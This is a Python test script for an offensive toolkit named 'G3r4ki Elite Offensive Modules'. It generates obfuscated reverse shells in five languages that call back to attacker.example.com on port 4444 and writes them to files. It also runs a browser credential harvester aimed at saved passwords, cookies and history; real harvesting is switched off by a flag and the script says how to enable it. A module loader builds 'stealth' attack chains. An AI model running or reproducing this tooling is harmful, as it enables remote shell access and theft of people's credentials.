#!/usr/bin/env python3
"""
Test script for G3r4ki's Elite Offensive Modules
"""

import os
import sys
import json
import argparse
import logging
from typing import Dict, Any, List, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('test_offensive_elite')

def test_shell_generator():
    """Test the reverse shell generator"""
    from src.offensive.modules.shells.reverse_shell_generator import ReverseShellGenerator
    
    # Create output directory
    output_dir = "results/shells"
    os.makedirs(output_dir, exist_ok=True)
    
    print("\n" + "=" * 80)
    print("Testing Elite Module: Reverse Shell Generator".center(80))
    print("=" * 80)
    
    # Initialize the shell generator
    generator = ReverseShellGenerator({
        'obfuscate': True,
        'encode': False,
        'platform_optimized': True
    })
    
    # List available shell types
    shell_types = generator.list_available_shells()
    print(f"\nAvailable shell types: {len(shell_types)}")
    for shell in shell_types:
        print(f"- {shell['type']}: {shell['description']}")
    
    # Generate shells
    host = "attacker.example.com"
    port = 4444
    
    # Generate a few example shells
    examples = ['bash', 'python', 'powershell', 'php', 'jsp']
    
    for shell_type in examples:
        try:
            print(f"\nGenerating {shell_type} shell:")
            print("-" * 40)
            
            # Generate shell
            shell = generator.generate_shell(shell_type, host, port, 'linux' if shell_type != 'powershell' else 'windows')
            
            # Display preview (first 10 lines)
            preview_lines = shell.split('\n')[:10]
            preview = '\n'.join(preview_lines)
            if len(preview_lines) < len(shell.split('\n')):
                preview += "\n..."
            print(preview)
            
            # Save to file
            file_ext = {
                'bash': '.sh',
                'python': '.py',
                'powershell': '.ps1',
                'php': '.php',
                'jsp': '.jsp'
            }.get(shell_type, '.txt')
            
            filename = os.path.join(output_dir, f"{shell_type}_shell{file_ext}")
            with open(filename, 'w') as f:
                f.write(shell)
                
            print(f"Saved to {filename}")
            
        except Exception as e:
            print(f"Error generating {shell_type} shell: {e}")
    
    print("\nShell generation test complete.")
    print(f"Shells saved to {output_dir}")
    return True

def test_credential_harvester():
    """Test the credential harvester module"""
    from src.offensive.modules.credential_harvesting.browser_credentials import BrowserCredentialHarvester
    
    print("\n" + "=" * 80)
    print("Testing Elite Module: Browser Credential Harvester".center(80))
    print("=" * 80)
    
    # Create output directory
    output_dir = "results/harvested"
    os.makedirs(output_dir, exist_ok=True)
    
    # Initialize the harvester
    harvester = BrowserCredentialHarvester()
    
    print("\nDetecting browser installations...")
    
    # Get browser paths for the current platform
    platform_key = harvester._get_platform_key()
    browser_paths = harvester.browser_paths.get(platform_key, {})
    
    # Check which browsers are installed
    installed_browsers = []
    for browser, path in browser_paths.items():
        if os.path.exists(path):
            installed_browsers.append(browser)
            print(f"✓ {browser.title()} detected at {path}")
        else:
            print(f"✗ {browser.title()} not detected")
    
    if not installed_browsers:
        print("\nNo supported browsers detected on this system.")
        print("This is normal in container environments like Replit.")
        
        # Create a simulated result for demonstration
        simulated_results = {
            "simulated_chrome": {
                "passwords": [
                    {"url": "https://example.com", "username": "<encrypted>", "password": "<encrypted>"},
                    {"url": "https://mail.example.com", "username": "<encrypted>", "password": "<encrypted>"}
                ],
                "cookies": [
                    {"host": "example.com", "name": "session", "value": "<encrypted>", "expires": "2025-05-01"}
                ],
                "history": [
                    {"url": "https://example.com/login", "title": "Login Page", "visit_time": "2025-04-28T12:00:00"},
                    {"url": "https://example.com/account", "title": "Account Management", "visit_time": "2025-04-28T12:05:00"}
                ]
            }
        }
        
        # Save simulated results
        results_file = os.path.join(output_dir, "simulated_browser_credentials.json")
        with open(results_file, 'w') as f:
            json.dump(simulated_results, f, indent=2)
            
        print(f"\nCreated simulated browser harvesting results for demonstration.")
        print(f"Saved to {results_file}")
        return True
    
    # For real harvesting (disabled by default for security)
    if False:  # Change to True to enable actual harvesting
        print("\nHarvesting credentials from installed browsers...")
        results = harvester.harvest_all_browsers()
        
        # Save results
        results_file = os.path.join(output_dir, "harvested_browser_credentials.json")
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
            
        print(f"Harvested credentials saved to {results_file}")
    else:
        print("\nActual credential harvesting is disabled in this test script.")
        print("To enable real harvesting, modify this script.")
    
    return True

def test_module_loader():
    """Test the module loader system"""
    from src.offensive.module_loader import ModuleLoader
    
    print("\n" + "=" * 80)
    print("Testing Elite Module System: Module Loader".center(80))
    print("=" * 80)
    
    # Initialize module loader
    loader = ModuleLoader()
    
    # Check for available modules
    modules = loader.get_available_modules()
    print(f"\nDetected {len(modules)} modules:")
    
    # Group modules by category
    categories = {}
    for module_id, metadata in modules.items():
        category = module_id.split('.')[0]
        if category not in categories:
            categories[category] = []
            
        categories[category].append((module_id, metadata))
        
    # Print modules by category
    for category, module_list in categories.items():
        print(f"\n{category.title()} Modules:")
        print("-" * (len(category) + 9))
        
        for module_id, metadata in module_list:
            print(f"- {module_id}: {metadata.name} (v{metadata.version})")
            print(f"  {metadata.description}")
            print(f"  Stealth: {metadata.stealth_level}/10, Effectiveness: {metadata.effectiveness}/10")
    
    # Test creating a mission module chain
    from src.offensive import MISSION_PROFILES
    
    print("\n" + "-" * 80)
    print("Testing Mission-Based Module Chain Generation")
    print("-" * 80)
    
    # Show available mission types
    print("\nAvailable mission profiles:")
    for mission_type, profile in MISSION_PROFILES.items():
        print(f"- {mission_type}: {profile['description']}")
    
    # Create a test module chain
    mission_type = "stealth"
    target_platform = "linux"
    
    print(f"\nCreating module chain for {mission_type} mission on {target_platform}...")
    
    # Define available resources
    available_resources = {
        'cpu': 2,
        'memory': 512,
        'disk': 1024
    }
    
    try:
        # Create module chain
        module_chain = loader.create_chain(mission_type, target_platform, available_resources)
        
        if module_chain:
            print(f"\nGenerated module chain with {len(module_chain)} modules:")
            for i, module_id in enumerate(module_chain):
                if module_id in modules:
                    metadata = modules[module_id]
                    print(f"{i+1}. {module_id}: {metadata.name}")
                    print(f"   Stealth: {metadata.stealth_level}/10, Effectiveness: {metadata.effectiveness}/10")
                else:
                    print(f"{i+1}. {module_id} (Not available)")
        else:
            print("No modules matched the criteria for this mission.")
    except Exception as e:
        print(f"Error creating module chain: {e}")
    
    return True

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="Test G3r4ki Elite Offensive Modules")
    parser.add_argument("--shells", action="store_true", help="Test reverse shell generator")
    parser.add_argument("--creds", action="store_true", help="Test credential harvester")
    parser.add_argument("--loader", action="store_true", help="Test module loader")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    
    args = parser.parse_args()
    
    # Default to running all tests if no specific test is selected
    run_all = args.all or not (args.shells or args.creds or args.loader)
    
    print("\n" + "#" * 80)
    print("G3r4ki Elite Offensive Framework - Module Tests".center(80))
    print("#" * 80)
    
    results = {}
    
    if args.shells or run_all:
        results['shell_generator'] = test_shell_generator()
        
    if args.creds or run_all:
        results['credential_harvester'] = test_credential_harvester()
        
    if args.loader or run_all:
        results['module_loader'] = test_module_loader()
        
    # Print summary
    print("\n" + "=" * 80)
    print("Test Results Summary".center(80))
    print("=" * 80)
    
    for test_name, success in results.items():
        status = "✓ PASSED" if success else "✗ FAILED"
        print(f"{test_name}: {status}")
        
    return 0

if __name__ == "__main__":
    sys.exit(main())